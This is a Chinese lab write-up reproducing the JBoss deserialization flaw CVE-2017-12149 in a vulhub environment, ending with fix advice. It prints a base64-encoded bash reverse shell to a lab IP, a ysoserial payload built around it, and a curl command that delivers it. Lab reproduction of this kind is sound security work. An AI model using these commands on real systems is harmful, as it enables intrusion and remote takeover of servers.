# JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）

### 0x00 简介

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

### 0x01 环境搭建

使用vulhub搭建环境`jboss/CVE-2017-12149`

![image-20230412153049744](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412153049744.png)

首次执行时会有1~3分钟时间初始化，初始化完成后访问`http://your-ip:8080/`即可看到JBoss默认页面。

### 0x02 复现步骤

1、访问`http://your_ip:8080/invoker/readonly`出现以下界面说明漏洞存在

![image-20230412162405781](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412162405781.png)

2、反弹shell命令

```shell
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}
```

3、生成序列化数据

```
java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}" > poc.ser
```

4、将生成的序列化数据发送至/invoker/readonly，获取shell

```shell
curl http://192.168.12.130:8080/invoker/readonly --data-binary @poc.ser
```

![image-20230412164228245](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412164228245.png)

### 0x03 修复建议

1、删除http-invoker.sar组件，路径如下jboss-6.1.0.Final\server\default\deploy\http-invoker.sar

2、升级JBoss到最新版本。

